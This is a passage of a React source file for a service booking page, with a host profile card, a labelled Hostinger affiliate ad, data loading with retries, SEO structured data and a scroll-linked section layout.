              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
            </svg>
            <span>Follow safety measures advised at the venue</span>
          </li>
        </ul>
      </div>
    </div>
  );
};

// ─── Hostinger affiliate slot — "your own domain" offer, full Hostinger purple ──
const HOSTINGER_URL = 'https://www.hostinger.com/in?REFERRALCODE=meeticulous';
const HostingerCard = () => (
  <a href={HOSTINGER_URL} target="_blank" rel="noreferrer sponsored"
    className="relative flex items-center gap-3.5 overflow-hidden rounded-2xl p-4 no-underline"
    style={{ background: '#673DE6' }}>
    <span className="absolute right-3 top-2 text-[11px] text-white/70">Ad</span>
    <span className="flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-[14px] bg-white text-[26px] font-black" style={{ color: '#673DE6' }}>H</span>
    <span className="min-w-0">
      <span className="block text-[15px] font-black leading-tight text-white">Buy yourname.com for ₹1</span>
      <span className="mt-0.5 block text-xs text-white/80">Domain + hosting on Hostinger</span>
      <span className="mt-2 inline-block rounded-full bg-white px-3 py-1 text-xs font-bold" style={{ color: '#673DE6' }}>Claim offer →</span>
    </span>
  </a>
);

// ─── Profile Card (creator summary — sits below the booking card) ─────────────
// Premium, vertical layout distinct from the HostTab. Excludes bio.
const ProfileCard = ({ vendor, rating, reviewCount, bookings }) => {
  const [btnHover, setBtnHover] = useState(false);
  if (!vendor?.name) return null;

  const expertise = [vendor.profession, vendor.tagline]
    .filter(Boolean)
    .filter((v, i, a) => a.indexOf(v) === i);

  const accent = 'var(--profile-accent, #960D32)';

  return (
    <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
      <div className="px-5 pb-5 pt-5 text-center">
        {/* Photo — centered */}
        <div className="flex justify-center mb-3">
          <div className="w-20 h-20 rounded-2xl border-[3px] border-white shadow-sm overflow-hidden bg-white">
            {vendor.profile_image
              ? <img src={vendor.profile_image} alt={vendor.name} className="w-full h-full object-cover"/>
              : <div className="w-full h-full flex items-center justify-center text-2xl font-bold"
                  style={{ background: `color-mix(in srgb, ${accent} 12%, white)`, color: accent }}>
                  {vendor.name.charAt(0).toUpperCase()}
                </div>}
          </div>
        </div>

        {/* Name + verified — centered */}
        <div className="flex items-center justify-center gap-1.5">
          <h3 className="text-base font-bold text-gray-900">{vendor.name}</h3>
          {vendor.is_verified && (
            <svg className="w-4 h-4 flex-shrink-0 text-green-500" fill="currentColor" viewBox="0 0 24 24">
              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
            </svg>
          )}
        </div>

        {/* Profession — plain text, no badge */}
        {expertise.length > 0 && (
          <p className="text-sm text-gray-500 mt-1">{expertise.join(' · ')}</p>
        )}

        {/* Inline stats: rating · bookings */}
        {(rating > 0 || bookings > 0) && (
          <div className="flex items-center justify-center flex-wrap gap-x-4 gap-y-1 mt-3 text-sm">
            {rating > 0 && (
              <span className="flex items-center gap-1 text-gray-700">
                <svg className="w-4 h-4 text-amber-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                <strong className="font-semibold text-gray-900">{rating.toFixed(1)}</strong>
                <span className="text-gray-400">({reviewCount})</span>
              </span>
            )}
            {bookings > 0 && (
              <span className="flex items-center gap-1 text-gray-700">
                <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
                <strong className="font-semibold text-gray-900">{bookings}</strong>
                <span className="text-gray-400">booked</span>
              </span>
            )}
          </div>
        )}

        {/* View full profile — white→brand on hover, no underline */}
        {vendor.username && (
          <Link to={`/${vendor.username}`}
            onMouseEnter={() => setBtnHover(true)} onMouseLeave={() => setBtnHover(false)}
            className="btn btn--outline mt-5 w-full inline-flex items-center justify-center gap-1.5 py-2.5 text-sm font-semibold no-underline transition-colors"
            style={{
              background: btnHover ? accent : '#ffffff',
              color: btnHover ? '#ffffff' : accent,
            }}>
            View full profile
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7"/></svg>
          </Link>
        )}
      </div>
    </div>
  );
};

// ─── Main Component ───────────────────────────────────────────────────────────

export default function ServiceDetail() {
  const { profileSlug, serviceSlug } = useParams();
  const navigate  = useNavigate();
  // Build-time copy baked into the prerendered HTML → real content on the first
  // frame; the fetch below refreshes it (slots are never baked — always live).
  const seedPath = `/services/public/${profileSlug}/${serviceSlug}`;
  const [data, setData]     = useState(() => prerendered(seedPath) || null);
  const [loading, setLoading] = useState(() => !prerendered(seedPath));
  const [error, setError]   = useState('');
  // Not-found state gets the stripped minimal footer, header kept.
  useMinimalFooter(!loading && (!!error || !data));
  const [activeSection, setActiveSection] = useState('');

  // Desktop sidebar polish: collapse the booking-card thumbnail once the reader
  // scrolls past the hero (IntersectionObserver — no scroll handler), and honour
  // reduced-motion by skipping the collapse transition.
  const heroEndRef = useRef(null);
  const [heroInView, setHeroInView] = useState(true);
  const [motionOK, setMotionOK] = useState(true);

  useEffect(() => {
    if (!data) return;
    const onScroll = () => {
      const scrollPct = window.scrollY / (document.documentElement.scrollHeight - window.innerHeight);
      setHeroInView(scrollPct < 0.05);
    };
    onScroll();
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, [data]);

  useEffect(() => {
    if (typeof window === 'undefined' || !window.matchMedia) return;
    const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
    const update = () => setMotionOK(!mq.matches);
    update();
    mq.addEventListener?.('change', update);
    return () => mq.removeEventListener?.('change', update);
  }, []);

  // Scrollspy — highlight the section-nav link for whatever section is in view.
  useEffect(() => {
    const els = document.querySelectorAll('[data-section]');
    if (!els.length) return;
    const obs = new IntersectionObserver((entries) => {
      entries.forEach(e => { if (e.isIntersecting) setActiveSection(e.target.id); });
    }, { rootMargin: '-72px 0px -62% 0px', threshold: 0 });
    els.forEach(el => obs.observe(el));
    return () => obs.disconnect();
  }, [data, loading]);

  useEffect(() => {
    let alive = true;
    setError('');
    const applyTheme = (v) => applyProfileTheme(
      document.documentElement,
      isValidHex(v?.theme_color) ? v.theme_color : DEFAULT_THEME_COLOR,
    );
    const baked = prerendered(`/services/public/${profileSlug}/${serviceSlug}`);
    if (baked) { setData(baked); setLoading(false); applyTheme(baked.vendor); } else setLoading(true);
    // Only a real 404 means the service is gone → the noindex ErrorPage is correct.
    // Any OTHER failure (network/timeout, 5xx, or a 429/403 from an edge rate-limit
    // or IP guard) is transient: retry with a short backoff, then fall to the
    // non-noindex 'transient' state so a JS-rendering crawler that hit a transient
    // API failure doesn't noindex this live, prerendered page. See TransientError.
    const load = (attempt = 0) => {
      svcGetPublicByProfile(profileSlug, serviceSlug)
        .then(r => {
          if (!alive) return;
          setData(r.data);
          // Per-host theme → CSS vars consumed by the Book Slot CTAs
          const v = r.data?.vendor;
          applyProfileTheme(
            document.documentElement,
            isValidHex(v?.theme_color) ? v.theme_color : DEFAULT_THEME_COLOR,
          );
          // SEO (title/description/robots/canonical/OG/JSON-LD) is rendered
          // declaratively via <Seo> below, from the admin-managed fields.
          setLoading(false);
        })
        .catch((err) => {
          if (!alive) return;
          if (isNotFoundError(err)) { setError('notfound'); setLoading(false); return; }
          if (attempt < 2) { setTimeout(() => { if (alive) load(attempt + 1); }, 800 * (attempt + 1)); return; }
          if (!baked) setError('transient'); // baked copy stays on a transient failure
          setLoading(false);
        });
    };
    load();
    return () => { alive = false; };
  }, [profileSlug, serviceSlug]);

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="text-center text-gray-400">
        <div className="mb-2 flex justify-center"><PetalSpinner size={40} /></div>
        Loading…
      </div>
    </div>
  );

  // A transient failure must NOT noindex a live, prerendered service page — use the
  // non-noindex fallback. A genuinely gone service (404, or an empty payload) still
  // renders the branded noindex ErrorPage, avoiding the thin-200 "soft 404".
  if (error === 'transient') return <TransientError message="This service didn’t load. Please try again." />;
  if (error === 'notfound' || !data) return <ErrorPage code={404} />;

  const { service, vendor, totalServices, totalBookings, reviews, avgRating, ratingBreakdown, bookingFee, bookingFeeBreakdown } = data;

  const handleBookNow = () => {
    // Navigate to /:profileSlug/booking/:serviceSlug
    const pSlug = vendor?.username || profileSlug;
    if (pSlug && service?.slug) {
      navigate(`/${pSlug}/booking/${service.slug}`);
    }
  };

  // Host-authored FAQ wins; otherwise a data-derived templated FAQ so the page (and
  // its FAQPage schema) always carries real, extractable Q&A. Same rule server-side
  // (prerenderController + pageContentModel) so bot HTML matches what guests see.
  const faqs = (Array.isArray(service.faqs) && service.faqs.length)
    ? service.faqs
    : serviceFaqs({ service, vendor });
  const hasFAQs = faqs.length > 0;
  const hasDeliverables = (service.included_items?.length || 0) + (service.excluded_items?.length || 0) > 0;

  // Hero trust signals (derived from existing data — no schema change)
  const rating      = avgRating || service.rating || 0;
  const reviewCount = reviews?.length || service.total_reviews || 0;
  const bookings    = service.total_bookings || 0;
  // Bestseller heuristic: proven volume + high rating
  const isBestseller = bookings >= 10 && rating >= 4.5;
  // Hero eyebrow — "Category · 1:1 Session"
  const eyebrow = [service.category_label, TYPE_LABEL[service.type]].filter(Boolean).join(' · ');

  // Admin-managed SEO → head tags + Service JSON-LD (canonical derived from URL).
  const seo = resolveServiceSeo({ service, vendor, siteUrl: SEO_SITE });
  const jsonLd = [
    serviceJsonLd({ service, vendor, siteUrl: SEO_SITE, avgRating: rating, reviewCount }),
    breadcrumbJsonLd({ items: [
      { name: 'Home', path: '/' },
      { name: vendor.name || vendor.username, path: `/${vendor.username}` },
      { name: service.title, path: `/${vendor.username}/${service.slug}` },
    ], siteUrl: SEO_SITE }),
    ...(faqs.length
      ? [faqJsonLd({ faqs: faqs.map(f => ({ q: f.question, a: f.answer })) })]
      : []),
  ];

  // Scrolling sections (replaces tabs). Optional sections appear only when they
  // carry content, so no empty section/nav item is ever shown.
  const sections = [
    { id: 'overview', label: 'Overview', heading: `Overview about ${service.title}`,
      node: <OverviewTab html={service.long_description || service.description} /> },
    hasDeliverables && { id: 'deliverables', label: 'Deliverables', heading: 'Deliverables',
      node: <DeliverablesTab included={service.included_items} excluded={service.excluded_items} /> },
    { id: 'host', label: 'Host', heading: 'Host',
      node: (
        <>
          <HostTab vendor={vendor} totalServices={totalServices} totalBookings={totalBookings} />
          <AvailableSlotsPreview hostId={vendor?.id} serviceId={service.id} onViewAll={handleBookNow} />
        </>
      ) },
    hasFAQs && { id: 'faq', label: 'FAQ', count: faqs.length, heading: 'FAQ',
      node: <FAQTab faqs={faqs} /> },
    service.important_note && { id: 'notes', label: 'Important Notes', heading: 'Important Notes',
      node: <ImportantNotes text={service.important_note} /> },
    { id: 'reviews', label: 'Reviews', count: reviews?.length || 0, heading: 'Reviews',
      node: <ReviewsTab reviews={reviews} avgRating={avgRating} ratingBreakdown={ratingBreakdown} /> },
  ].filter(Boolean);

  // Smooth-scroll to a section, offsetting the sticky section nav.
  const scrollToSection = (id) => {
    const el = document.getElementById(id);
    if (!el) return;
    const top = el.getBoundingClientRect().top + window.scrollY - 72;
    window.scrollTo({ top, behavior: motionOK ? 'smooth' : 'auto' });
    setActiveSection(id);
  };

  return (
    <div className="min-h-screen bg-canvas relative">
      <Seo {...seo} jsonLd={jsonLd} />
      {/* ── Above-the-fold backdrop — flat brand-maroon field with a tone-on-tone
           slot pattern (open = marigold, booked = maroon + pink dot) and one ee
           thread bleeding off the bottom-right. Host theme colour stays off the
           hero; it paints CTAs/badges only. ── */}
      <div aria-hidden data-bg-band
        className="pointer-events-none absolute inset-x-0 top-0 h-[34rem] sm:h-[30rem] overflow-hidden z-[1] bg-maroon">

        {/* ── Slot pattern — right-biased booking-slot pills, faded ── */}
        <svg className="absolute inset-0 h-full w-full opacity-60" viewBox="0 0 1200 520"
          preserveAspectRatio="xMaxYMid slice" fill="none">
          <defs>
            <linearGradient id="slot-fade" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor="#fff" stopOpacity="1"/>
              <stop offset="70%" stopColor="#fff" stopOpacity="0.35"/>
              <stop offset="100%" stopColor="#fff" stopOpacity="0"/>
            </linearGradient>
            <mask id="slot-mask"><rect width="1200" height="520" fill="url(#slot-fade)"/></mask>
          </defs>
          <g mask="url(#slot-mask)">
            <rect x="760" y="56" width="150" height="46" rx="20" fill="none" stroke="#FF9FB0" strokeWidth="1.5" opacity="0.5"/>
            <rect x="936" y="56" width="110" height="46" rx="20" fill="none" stroke="#FF9FB0" strokeWidth="1.5" opacity="0.32"/>
            <rect x="820" y="128" width="130" height="46" rx="20" fill="none" stroke="#F6C35A" strokeWidth="1.5" opacity="0.6"/>
            <rect x="978" y="128" width="92" height="46" rx="20" fill="#7A0A28"/>
            <circle cx="998" cy="151" r="4" fill="#FF9FB0"/>
            <rect x="700" y="200" width="118" height="46" rx="20" fill="none" stroke="#FF9FB0" strokeWidth="1.5" opacity="0.3"/>
            <rect x="846" y="200" width="150" height="46" rx="20" fill="none" stroke="#FF9FB0" strokeWidth="1.5" opacity="0.42"/>
            <rect x="1024" y="200" width="88" height="46" rx="20" fill="none" stroke="#F6C35A" strokeWidth="1.5" opacity="0.5"/>
            <rect x="768" y="272" width="112" height="46" rx="20" fill="none" stroke="#FF9FB0" strokeWidth="1.5" opacity="0.24"/>
            <rect x="908" y="272" width="146" height="46" rx="20" fill="#7A0A28"/>
            <circle cx="928" cy="295" r="4" fill="#FF9FB0"/>
          </g>
        </svg>

        {/* ── ee thread — one per layout, bleeding off the bottom-right, behind content ── */}
        <img src="/brand/ds/02-ee/mt-ee-pink.svg" alt="" aria-hidden
          className="absolute bottom-0 right-0 w-[320px] max-w-[55%] translate-x-6 translate-y-6 opacity-20"/>
      </div>

      {/* ── HERO + Content — single container so sidebar starts under h1 ── */}
      <div className="app-container pb-28 lg:pb-8 relative z-10" style={{ paddingTop: 44 }}>
        {/* Breadcrumb */}
        <nav className="mb-4 text-xs text-white/50 font-medium" aria-label="Breadcrumb">
          <Link to="/" className="hover:text-white transition-colors">home</Link>
          <span className="mx-1">/</span>
          {vendor?.username && (
            <>
              <Link to={`/${vendor.username}`} className="hover:text-white transition-colors">{vendor.username}</Link>
              <span className="mx-1">/</span>
            </>
          )}
          <span className="text-white/70 max-w-[120px] sm:max-w-[200px] truncate inline-block align-bottom">{service.slug || 'service'}</span>
        </nav>

        <div className="flex flex-col lg:flex-row gap-8">
          {/* ── LEFT: Hero + tabs ── */}
          <div className="flex-1 min-w-0">
            <section className="relative pb-6">

              {isBestseller && (
                <span className="mb-3 inline-flex items-center gap-1.5 rounded-full bg-pink px-3 py-1 text-xs font-bold text-maroon-dark">
                  <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                  Bestseller
                </span>
              )}

              {/* Eyebrow */}
              {eyebrow && (
                <p className="mb-3 text-xs font-semibold uppercase tracking-[0.12em] text-white/60">{eyebrow}</p>
              )}

              {/* Title — 110% of content column width */}
              <h1 className="text-4xl sm:text-5xl font-black text-white mb-4 leading-[1.1] tracking-tight" style={{ maxWidth: '110%' }}>
                {service.title}
              </h1>

              {/* Short description — 90% width */}
              {service.short_description && (
                <p className="text-base sm:text-lg text-white/80 mb-6 leading-relaxed" style={{ maxWidth: '90%' }}>{service.short_description}</p>
              )}

              {/* Meta — clock | meet/in-person | hosted by — single horizontal line + Important Notes pill */}
              <div className="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-white/90">
                <span className="flex items-center gap-1.5">
                  <svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
                  {fmtDuration(service.duration)}
                </span>
                <span className="text-white/30">|</span>
                <span className="flex items-center gap-1.5">
                  {service.meeting_mode === 'offline'
                    ? <><svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a2 2 0 01-2.828 0l-4.243-4.243a8 8 0 1111.314 0z"/><circle cx="12" cy="11" r="2.5"/></svg>In-person</>
                    : <><svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>Google Meet</>}
                </span>
                {vendor?.name && (
                  <>
                    <span className="text-white/30">|</span>
                    <span className="flex items-center gap-1.5">
                      <span>Hosted by</span>
                      {vendor.profile_image && (
                        <img src={vendor.profile_image} alt="" className="w-[23px] h-[23px] rounded-full object-cover ring-1 ring-primary" />
                      )}
                      <Link to={`/${vendor.username}`} className="font-semibold hover:text-primary transition-colors underline decoration-white/40 hover:decoration-current underline-offset-2">
                        {vendor.name}
                      </Link>
                    </span>
                  </>
                )}
              </div>
              {/* Sentinel — when this scrolls out of view, sidebar thumbnail collapses */}
              <div ref={heroEndRef} className="h-px" aria-hidden />
            </section>

            {/* Sections — sticky scrollspy nav + stacked panels (replaces tabs) */}
            <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
              <nav className="sticky top-16 z-20 flex gap-1 overflow-x-auto border-b border-gray-100 bg-white px-2 scrollbar-hide" aria-label="Sections">
                {sections.map(s => (
                  <a key={s.id} href={`#${s.id}`}
                    onClick={(e) => { e.preventDefault(); scrollToSection(s.id); }}
                    className={`whitespace-nowrap flex-shrink-0 border-b-2 px-4 py-3.5 text-sm font-medium transition-colors ${activeSection === s.id ? 'border-primary text-primary' : 'border-transparent text-gray-500 hover:text-gray-800'}`}>
                    {s.label}
                    {s.count > 0 && <span className="ml-1.5 rounded-full bg-blush px-1.5 py-0.5 text-xs text-maroon">{s.count}</span>}
                  </a>
                ))}
              </nav>
              <div className="divide-y divide-gray-100">
                {sections.map(s => (
                  <section key={s.id} id={s.id} data-section className="scroll-mt-28 p-6">
                    <h2 className="mb-4 text-base font-bold text-gray-900">{s.heading}</h2>
                    {s.node}
                  </section>
                ))}
              </div>
            </div>
          </div>

          {/* ── RIGHT: Sticky sidebar ── */}
          <div className="hidden lg:block lg:w-[320px] flex-shrink-0">
            <div className="sticky top-20 flex flex-col gap-5">
              <BookingCard service={service} onBookNow={handleBookNow} bookingFee={bookingFee} bookingFeeBreakdown={bookingFeeBreakdown} compact={!heroInView} motionOK={motionOK}/>
              <ProfileCard vendor={vendor} rating={rating} reviewCount={reviewCount} bookings={bookings}/>
              <HostingerCard/>
            </div>
          </div>
        </div>
      </div>

      {/* ── Mobile: sticky bottom CTA bar ── */}
      <div className="lg:hidden fixed bottom-0 inset-x-0 z-40 flex items-center gap-3 bg-white border-t border-gray-200 shadow-[0_-4px_20px_rgba(0,0,0,0.06)] px-4 py-3 pb-[calc(0.75rem+env(safe-area-inset-bottom))]">
        <div className="relative flex-1 min-w-0">
          {service.price_on_request === true ? (
            <div className="text-base font-black text-gray-900 leading-none">Price on request</div>
          ) : service.price === 0 ? (
            <div className="text-xl font-black text-gray-900 leading-none">Free</div>
          ) : (
            <>
              <div className="flex items-baseline gap-1.5">
                <span className="text-xl font-black text-gray-900 leading-none">₹{service.price}</span>
              </div>
              {(bookingFeeBreakdown?.platformFee || 0) > 0 && (
                <p className="text-[11px] text-gray-500 mt-0.5">+ ₹{bookingFeeBreakdown.platformFee} platform fee</p>
              )}
            </>
          )}
        </div>
        <button onClick={handleBookNow}
          className="btn cta-press flex-shrink-0 inline-flex items-center gap-2 px-6 py-3 font-bold text-sm">
          Book a Slot
          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
        </button>
      </div>
    </div>
  );
}
